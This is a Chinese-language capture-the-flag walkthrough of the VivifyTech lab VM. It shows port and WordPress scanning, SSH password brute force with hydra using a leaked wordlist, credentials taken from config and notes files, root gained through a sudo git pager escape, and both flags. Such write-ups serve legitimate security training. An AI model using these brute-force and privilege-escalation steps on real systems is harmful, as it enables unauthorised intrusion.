# VivifyTech

:::note

[Linux VM] [Tested on VirtualBox and VMWare.] created by || Sancelisso

⏲️ Release Date // 2023-12-28

✔️ MD5 // d8d796aa8ac7998128f555f3c61360a5

☠ Root // 67

💀 User // 67

📝Notes //
Can you go deeper to pwn VivifyTech?

:::

## 靶机启动

靶机 IP：

```plaintext
192.168.56.103
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.103
Host is up (0.00064s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey:
|   256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA)
|_  256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519)
80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns:
|     Invalid message-frame."
|_    HY000
```

## web 服务

尝试扫描目录

```plaintext
[19:31:39] 200 -   10KB - /index.html
[19:32:06] 200 -    5KB - /wordpress/wp-login.php
[19:32:06] 200 -   83KB - /wordpress/
```

发现存在一个 wordpress 站点 `http://192.168.56.103/wordpress/`

尝试使用 wpscan 进行扫描

```plaintext
[+] XML-RPC seems to be enabled: http://192.168.56.103/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.103/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.103/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.103/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.1 identified (Insecure, released on 2023-11-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.103/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.1</generator>
 |  - http://192.168.56.103/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.1</generator>
 |
 | [!] 3 vulnerabilities identified:
 |
 | [!] Title: WP 6.4-6.4.1 - POP Chain
 |     Fixed in: 6.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/2afcb141-c93c-4244-bde4-bf5c9759e8a3
 |      - https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 6.4.3
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 6.4.3
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.56.103/wordpress/wp-content/themes/twentytwentyfour/
 | Readme: http://192.168.56.103/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://192.168.56.103/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.103/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'
```

同时尝试列举用户信息，得到

```plaintext
[+] sancelisso
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.56.103/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

同时对wordpress常见目录进行探测，发现以下文件

```plaintext title="http://192.168.56.103/wordpress/wp-includes/secrets.txt"
agonglo
tegbesou
paparazzi
womenintech
Password123
bohicon
agodjie
tegbessou
Oba
IfÃƒÂ¨
Abomey
Gelede
BeninCity
Oranmiyan
Zomadonu
Ewuare
Brass
Ahosu
Igodomigodo
Edaiken
Olokun
Iyoba
Agasu
Uzama
IhaOminigbon
Agbado
OlokunFestival
Ovoranmwen
Eghaevbo
EwuareII
Egharevba
IgueFestival
Isienmwenro
Ugie-Olokun
Olokunworship
Ukhurhe
OsunRiver
Uwangue
miammiam45
Ewaise
Iyekowa
Idia
Olokunmask
Emotan
OviaRiver
Olokunceremony
Akenzua
Edoculture
```

同时在`http://192.168.56.103/wordpress/index.php/2023/12/05/the-story-behind-vivifytech/`这篇文章中，发现多个用户名

```plaintext
sarah
mark
emily
jake
alex
sancelisso
```

尝试使用已得到的信息进行爆破凭据

```shell
┌─[randark@parrot]─[~/tmp]
└──╼ $hydra -L user.txt -P secret.txt 192.168.56.103 ssh
......
[22][ssh] host: 192.168.56.103   login: sarah   password: bohicon
......
```

## User - sarah

```shell
┌─[randark@parrot]─[~/tmp]
└──╼ $pwncat-cs sarah@192.168.56.103
[19:59:22] Welcome to pwncat 
Password: *******
[19:59:25] 192.168.56.103:22: normalizing shell path
           192.168.56.103:22: registered new host w/ db
(local) pwncat$ back
(remote) sarah@VivifyTech:/home/sarah$ whoami
sarah
```

### flag - user

```shell
(remote) sarah@VivifyTech:/home/sarah$ cat user.txt 
HMV{Y0u_G07_Th15_0ne_6543}
```

### wordpress 配置项

```php title="/var/www/html/wordpress/wp-config.php"
......
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'password' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
......
```

尝试连接

```shell
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| wordpress          |
+--------------------+

mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
```

### `.private`目录下存在备忘录

```plaintext title="/home/sarah/.private/Tasks.txt"
- Change the Design and architecture of the website
- Plan for an audit, it seems like our website is vulnerable
- Remind the team we need to schedule a party before going to holidays
- Give this cred to the new intern for some tasks assigned to him - gbodja:4Tch055ouy370N
```

## User - gbodja

检测到sudo存在特权程序

```plaintext title="sudo -l"
Matching Defaults entries for gbodja on VivifyTech:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !admin_flag, use_pty

User gbodja may run the following commands on VivifyTech:
    (ALL) NOPASSWD: /usr/bin/git
```

尝试利用git提权

```shell
gbodja@VivifyTech:~$ sudo -u root /usr/bin/git help config
# # https://gtfobins.github.io/gtfobins/git/
# whoami
root
```

## User - root

### flag - root

```shell
# cat root.txt
HMV{Y4NV!7Ch3N1N_Y0u_4r3_7h3_R007_8672}
```
